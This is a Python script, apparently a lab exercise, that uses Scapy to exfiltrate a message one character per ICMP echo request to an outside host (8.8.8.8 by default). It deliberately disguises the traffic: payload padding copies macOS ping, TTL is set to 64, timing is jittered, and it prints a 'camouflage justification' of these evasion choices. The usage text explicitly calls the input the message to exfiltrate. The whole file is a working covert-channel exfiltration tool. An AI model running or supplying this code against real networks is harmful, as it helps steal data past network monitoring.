#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import random
import subprocess
from typing import Optional, Dict

from scapy.all import IP, ICMP, Raw, send, conf  # type: ignore

# ---------- Utilidades ----------

def run_ping_once(dest: str, size: Optional[int] = None, timeout: int = 2) -> Dict[str, str]:
    cmd = ["ping", "-c", "1", "-n", "-W", str(timeout), dest]
    if size is not None:
        cmd = ["ping", "-c", "1", "-n", "-s", str(size), "-W", str(timeout), dest]

    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        out = e.output or ""

    fields = {
        "line": "",
        "bytes": "",
        "from": "",
        "icmp_seq": "",
        "ttl": "",
        "time_ms": "",
        "id": "",
        "payload_hint": f"{size if size is not None else 56}"
    }
    for line in out.splitlines():
        if "bytes from" in line and "icmp_seq" in line:
            fields["line"] = line.strip()
            m_from = re.search(r"(\d+)\s+bytes from ([\d\.]+)", line)
            if m_from:
                fields["bytes"] = m_from.group(1)
                fields["from"] = m_from.group(2)
            m_seq = re.search(r"icmp_seq=(\d+)", line)
            if m_seq:
                fields["icmp_seq"] = m_seq.group(1)
            m_ttl = re.search(r"ttl=(\d+)", line)
            if m_ttl:
                fields["ttl"] = m_ttl.group(1)
            m_time = re.search(r"time=([\d\.]+)\s*ms", line)
            if m_time:
                fields["time_ms"] = m_time.group(1)
            m_id = re.search(r"id=(\d+)", line)
            if m_id:
                fields["id"] = m_id.group(1)
            break
    return fields

def print_ping_fields(title: str, fields: Dict[str, str]):
    print(f"\n=== {title} ===")
    if not fields.get("line"):
        print("No se logró capturar una respuesta de ping (host no responde o bloquea ICMP).")
        return
    print(fields["line"])
    print(f"  · bytes: {fields.get('bytes','')}")
    print(f"  · from : {fields.get('from','')}")
    print(f"  · icmp_seq: {fields.get('icmp_seq','')}")
    print(f"  · ttl  : {fields.get('ttl','')}")
    print(f"  · time : {fields.get('time_ms','')} ms")
    if fields.get("id"):
        print(f"  · id   : {fields['id']}")
    print(f"  · payload hint (bytes): {fields['payload_hint']}")

# ---------- Payload ICMP con padding ----------

def make_icmp_payload(ch: str, total_len: int = 48) -> bytes:
    """
    Construye un payload ICMP de 'total_len' bytes.
    - Primer byte: el carácter 'útil' (ASCII). Si no es ASCII, usa '?'.
    - Resto: plantilla idéntica al ping real de macOS: 0x08 .. 0x07+total_len.
      (Para 48 bytes: 0x08..0x37)
    """
    if total_len <= 0:
        return b""

    # Plantilla (pattern) estilo macOS que viste en Wireshark
    template = bytes((i & 0xFF) for i in range(0x08, 0x08 + total_len))

    # Carácter útil (1 byte)
    try:
        useful = ch.encode("ascii", errors="strict")[0:1]
        if not useful:
            useful = b'?'
    except Exception:
        useful = b'?'

    # Reemplaza SOLO el primer byte por el carácter útil
    # (1 byte de mensaje + padding "legítimo")
    payload = useful + template[1:]
    # Asegura longitud exacta
    return payload[:total_len]

def send_icmp_chars(message: str, dest: str, base_ttl: int = 64,
                    delay_range=(0.2, 0.6), payload_len: int = 48):
    icmp_id = os.getpid() & 0xFFFF
    icmp_seq = 1
    conf.checkIPaddr = False
    toggle_cap = True

    for ch in message:
        data = make_icmp_payload(ch, total_len=payload_len)
        pkt = IP(dst=dest, ttl=base_ttl) / ICMP(type=8, code=0, id=icmp_id, seq=icmp_seq) / Raw(load=data)
        send(pkt, verbose=0)

        print(("Sent 1 packets." if toggle_cap else "sent 1 packets."))
        toggle_cap = not toggle_cap

        icmp_seq += 1
        time.sleep(random.uniform(*delay_range))

def infer_base_ttl_from_reply(dest: str) -> int:
    fields = run_ping_once(dest)
    if fields.get("ttl"):
        try:
            ttl_reply = int(fields["ttl"])
            # Usamos 64 para mimetizar cliente Linux (común y razonable).
            return 64
        except:
            pass
    return 64

# ---------- Main ----------

def main():
    if len(sys.argv) < 2:
        print("Uso: sudo python3 pingv4.py \"mensaje_a_exfiltrar\" [destino] [payload_len]")
        print("Ej:  sudo python3 pingv4.py \"larycxpajorj h bnpdarmjm nw anmnb\" 8.8.8.8 48")
        sys.exit(1)

    message = sys.argv[1]
    dest = sys.argv[2] if len(sys.argv) >= 3 else "8.8.8.8"
    payload_len = int(sys.argv[3]) if len(sys.argv) >= 4 else 48  # 48 por tu captura

    # Ping real previo (para comparar)
    before = run_ping_once(dest, size=None)
    print_ping_fields("Ping real (previo)", before)

    base_ttl = infer_base_ttl_from_reply(dest)

    # Envío 1 char por paquete con padding hasta payload_len bytes
    send_icmp_chars(message, dest=dest, base_ttl=base_ttl,
                    delay_range=(0.2, 0.6), payload_len=payload_len)

    # Ping real posterior
    after = run_ping_once(dest, size=None)
    print_ping_fields("Ping real (posterior)", after)

    print("\n=== Justificación de camuflaje ===")
    print(f"* Payload fijo de {payload_len} bytes, con patrón 0x08.. y tu carácter en el primer byte (1B útil + padding).")
    print("* Tipo/código ICMP estándar (Echo Request type=8, code=0), id = PID & 0xffff, seq incremental.")
    print("* TTL=64 (típico cliente Linux). Jitter de envío 0.2–0.6 s.")
    print("* Comparamos ping real antes/después para verificar similitud de TTL/latencia/bytes.")

if __name__ == "__main__":
    main()